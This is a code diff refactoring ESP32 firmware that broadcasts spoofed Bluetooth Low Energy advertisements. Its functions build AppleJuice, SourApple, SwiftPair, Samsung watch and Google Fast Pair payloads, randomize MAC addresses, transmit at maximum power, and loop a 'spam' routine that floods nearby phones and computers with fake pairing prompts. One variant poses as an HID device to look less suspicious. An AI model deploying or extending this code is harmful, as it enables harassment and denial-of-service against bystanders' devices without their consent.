@@ -24,6 +24,8 @@ struct BLEData {
     BLEAdvertisementData ScanData;
 };
 
+BLEAdvertising *pAdvertising = nullptr;
+
 struct WatchModel {
     uint8_t value;
 };
@@ -320,15 +322,14 @@ const WatchModel watch_models[26] = {
     {0x20}, // "Green Watch6 Classic 43m"},
 };
 
-const char *generateRandomName() {
-    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    int len = rand() % 10 + 1;                                   // Generate a random length between 1 and 10
-    char *randomName = (char *)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
-    for (int i = 0; i < len; ++i) {
-        randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
-    }
-    randomName[len] = '\0'; // Null-terminate the string
-    return randomName;
+std::string generateRandomName() {
+    const char charset[] = "abcdefghijklmnopqrstuvwxyz"
+                           "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    int len = rand() % 10 + 1;
+    std::string s;
+    s.reserve(len);
+    for (int i = 0; i < len; i++) s += charset[rand() % (sizeof(charset) - 1)];
+    return s;
 }
 
 void generateRandomMac(uint8_t *mac) {
@@ -346,76 +347,70 @@ int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
 
 // ESP32 Sour Apple by RapierXbox
 // Exploit by ECTO-1A
-BLEAdvertising *pAdvertising;
 
 //// https://github.com/Spooks4576
 BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
     BLEAdvertisementData AdvData = BLEAdvertisementData();
 
-    uint8_t *AdvData_Raw = nullptr;
-    uint8_t i = 0;
-
     switch (Type) {
         case Microsoft: {
+            auto Name = generateRandomName();
+            int name_len = Name.size();
+            // Use std::string to handle memory automatically, avoiding raw new/delete.
+            std::string payload;
+            payload.reserve(7 + name_len);
 
-            const char *Name = generateRandomName();
-            uint8_t name_len = strlen(Name);
-            AdvData_Raw = new uint8_t[7 + name_len];
-            AdvData_Raw[i++] = 6 + name_len;
-            AdvData_Raw[i++] = 0xFF;
-            AdvData_Raw[i++] = 0x06;
-            AdvData_Raw[i++] = 0x00;
-            AdvData_Raw[i++] = 0x03;
-            AdvData_Raw[i++] = 0x00;
-            AdvData_Raw[i++] = 0x80;
-            memcpy(&AdvData_Raw[i], Name, name_len);
-            i += name_len;
+            payload += (char)(6 + name_len); // Length
+            payload += (char)0xFF;           // Type (Manufacturer Specific)
+            payload += (char)0x06;           // Company ID (Microsoft)
+            payload += (char)0x00;
+            payload += (char)0x03;
+            payload += (char)0x00;
+            payload += (char)0x80;
+            payload += Name; // Append the random name
 
-            AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
+            AdvData.addData(payload);
             break;
         }
         case AppleJuice: {
-            int rand = random(2);
-            if (rand == 0) {
+            int rand_choice = random(2);
+            if (rand_choice == 0) {
                 uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                       0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 31));
-            } else if (rand == 1) {
+            } else {
                 uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                       0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                       0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                       0x00, 0x00};
                 AdvData.addData(std::string((char *)packet, 23));
             }
-
             break;
         }
         case SourApple: {
             uint8_t packet[17];
             uint8_t i = 0;
-            packet[i++] = 16;   // Packet Length
-            packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
-            packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
-            packet[i++] = 0x00; // ...
-            packet[i++] = 0x0F; // Type
-            packet[i++] = 0x05; // Length
-            packet[i++] = 0xC1; // Action Flags
+            packet[i++] = 16;
+            packet[i++] = 0xFF;
+            packet[i++] = 0x4C;
+            packet[i++] = 0x00;
+            packet[i++] = 0x0F;
+            packet[i++] = 0x05;
+            packet[i++] = 0xC1;
             const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-            packet[i++] = types[random() % sizeof(types)]; // Action Type
-            esp_fill_random(&packet[i], 3);                // Authentication Tag
+            packet[i++] = types[random() % sizeof(types)];
+            esp_fill_random(&packet[i], 3);
             i += 3;
-            packet[i++] = 0x00; // ???
-            packet[i++] = 0x00; // ???
-            packet[i++] = 0x10; // Type ???
+            packet[i++] = 0x00;
+            packet[i++] = 0x00;
+            packet[i++] = 0x10;
             esp_fill_random(&packet[i], 3);
             AdvData.addData(std::string((char *)packet, 17));
-
             break;
         }
         case Samsung: {
-
             uint8_t model = watch_models[random(26)].value;
             uint8_t Samsung_Data[15] = {
                 0x0F,
@@ -435,27 +430,26 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
                 (uint8_t)((model >> 0x00) & 0xFF)
             };
             AdvData.addData(std::string((char *)Samsung_Data, 15));
-
             break;
         }
         case Google: {
-            const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+            const uint32_t model = android_models[rand() % android_models_count].value;
             uint8_t Google_Data[14] = {
                 0x03,
                 0x03,
                 0x2C,
-                0xFE, // First 3 data to announce Fast Pair
+                0xFE,
                 0x06,
                 0x16,
                 0x2C,
                 0xFE,
                 (uint8_t)((model >> 0x10) & 0xFF),
                 (uint8_t)((model >> 0x08) & 0xFF),
-                (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
+                (uint8_t)((model >> 0x00) & 0xFF),
                 0x02,
                 0x0A,
                 (uint8_t)((rand() % 120) - 100)
-            }; // 2 more data to inform RSSI data.
+            };
             AdvData.addData(std::string((char *)Google_Data, 14));
             break;
         }
@@ -464,77 +458,49 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             break;
         }
     }
-
-    delete[] AdvData_Raw;
-
+    // No longer need to delete AdvData_Raw, as it's been removed.
     return AdvData;
 }
+
 //// https://github.com/Spooks4576
 void executeSpam(EBLEPayloadType type) {
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
-    BLEDevice::init("");
-    vTaskDelay(10 / portTICK_PERIOD_MS);
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
+
+    // Get the advertising object
     pAdvertising = BLEDevice::getAdvertising();
+
     BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
     BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
+
     NimBLEUUID uuid((uint32_t)(random() & 0xFFFFFF));
     pAdvertising->addServiceUUID(uuid);
+
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->setScanResponseData(oScanResponseData);
+
     pAdvertising->start();
     vTaskDelay(50 / portTICK_PERIOD_MS);
-
     pAdvertising->stop();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
-    BLEDevice::deinit();
 }
 
 void executeCustomSpam(String spamName) {
     // Generate random MAC address
     uint8_t macAddr[6];
     for (int i = 0; i < 6; i++) { macAddr[i] = esp_random() & 0xFF; }
-    // Set the MAC address
     esp_base_mac_addr_set(macAddr);
 
-    // Initialize first time (helps clear the any previus spam)
-    BLEDevice::init("sh4rk");
-
-    vTaskDelay(5 / portTICK_PERIOD_MS);
-
-    // Set to maximum power
-    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-
-    // Get the advertising object
     pAdvertising = BLEDevice::getAdvertising();
-
     BLEAdvertisementData advertisementData = BLEAdvertisementData();
-
-    // make discoverable
     advertisementData.setFlags(0x06);
-
-    // add 3 random digits to the end so it doesnt get blacklisted
-    // String randomName = spamName + "_" + String(esp_random() % 100); //not needed since were changing mac
     advertisementData.setName(spamName.c_str());
-
-    pAdvertising->addServiceUUID(BLEUUID("1812")); // set to HID service so it seems less sus
-
-    // Set the advertisement data
+    pAdvertising->addServiceUUID(BLEUUID("1812"));
     pAdvertising->setAdvertisementData(advertisementData);
 
-    // Start advertising
     pAdvertising->start();
-
-    // Advertise for 20ms
-    // TODO (implement a way to change)
     vTaskDelay(20 / portTICK_PERIOD_MS);
-
-    // Stop and clean up
     pAdvertising->stop();
-    vTaskDelay(10 / portTICK_PERIOD_MS);
-    BLEDevice::deinit();
 }
 
 void ibeacon(char *DeviceName, char *BEACON_UUID, int ManufacturerId) {
@@ -616,65 +582,61 @@ void ibeacon(char *DeviceName, char *BEACON_UUID, int ManufacturerId) {
     BLEDevice::deinit();
 }
 
-void aj_adv(int ble_choice) { // customSet defaults to false
-    int mael = 0;
-    int timer = 0;
-    int count = 0;
-    String spamName = "";
-    if (ble_choice == 6) { spamName = keyboard("", 10, "Name to spam"); }
-    timer = millis();
-    while (1) {
-        if (millis() - timer > 100) {
+void aj_adv(int ble_choice) {
+    BLEDevice::init("");
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
 
-            switch (ble_choice) {
-                case 0: // Applejuice
-                    displayTextLine("Applejuice (" + String(count) + ")");
-                    executeSpam(AppleJuice);
-                    break;
-                case 1: // SourApple
-                    displayTextLine("SourApple (" + String(count) + ")");
-                    executeSpam(AppleJuice);
-                    break;
-                case 2: // SwiftPair
-                    displayTextLine("SwiftPair  (" + String(count) + ")");
-                    executeSpam(Microsoft);
-                    break;
-                case 3: // Samsung
-                    displayTextLine("Samsung  (" + String(count) + ")");
-                    executeSpam(Samsung);
-                    break;
-                case 4: // Android
-                    displayTextLine("Android  (" + String(count) + ")");
-                    executeSpam(Google);
-                    break;
-                case 5: // Tutti-frutti
-                    displayTextLine("Spam All  (" + String(count) + ")");
-                    if (mael == 0) executeSpam(Google);
-                    if (mael == 1) executeSpam(Samsung);
-                    if (mael == 2) executeSpam(Microsoft);
-                    if (mael == 3) executeSpam(SourApple);
-                    if (mael == 4) {
-                        executeSpam(AppleJuice);
-                        mael = 0;
-                    }
-                    break;
-                case 6: // custom
-                    displayTextLine("Spamming " + spamName + "(" + String(count) + ")");
-                    executeCustomSpam(spamName);
+    auto adv = BLEDevice::getAdvertising();
+
+    // Start once with initial payload
+    BLEAdvertisementData data = GetUniversalAdvertisementData((EBLEPayloadType)ble_choice);
+    adv->setAdvertisementData(data);
+    adv->start();
+
+    int count = 0, mael = 0;
+    int64_t timer = millis();
+    String spamName = (ble_choice == 6)
+                      ? keyboard("", 10, "Name to spam")
+                      : "";
+
+    const char* labels[] = {
+        "AppleJuice",
+        "SourApple",
+        "SwiftPair",
+        "Samsung",
+        "Android",
+        "SpamAll",
+        nullptr  // custom will use spamName
+    };
+
+    while (!returnToMenu) {
+        if (millis() - timer > 100) {
+            BLEAdvertisementData newData;
+            if (ble_choice == 6) {
+                newData.setFlags(0x06);
+                newData.setName(spamName.c_str());
+            } else {
+                EBLEPayloadType type = (EBLEPayloadType)(
+                    ble_choice < 5 ? ble_choice
+                                  : (mael = (mael + 1) % (Google + 1))
+                );
+                newData = GetUniversalAdvertisementData(type);
             }
+            adv->setAdvertisementData(newData);
+            const char* label = (ble_choice == 6)
+                    ? spamName.c_str()
+                    : labels[ble_choice];
+            displayTextLine(
+                String("Spamming ") +
+                String(label) +
+                " (" + String(count) + ")"
+            );
             count++;
             timer = millis();
         }
-
-        if (check(EscPress)) {
-            returnToMenu = true;
-            break;
-        }
+        if (check(EscPress)) break;
     }
 
-    BLEDevice::init("");
-    vTaskDelay(100 / portTICK_PERIOD_MS);
-    pAdvertising = nullptr;
-    vTaskDelay(100 / portTICK_PERIOD_MS);
+    adv->stop();
     BLEDevice::deinit();
 }
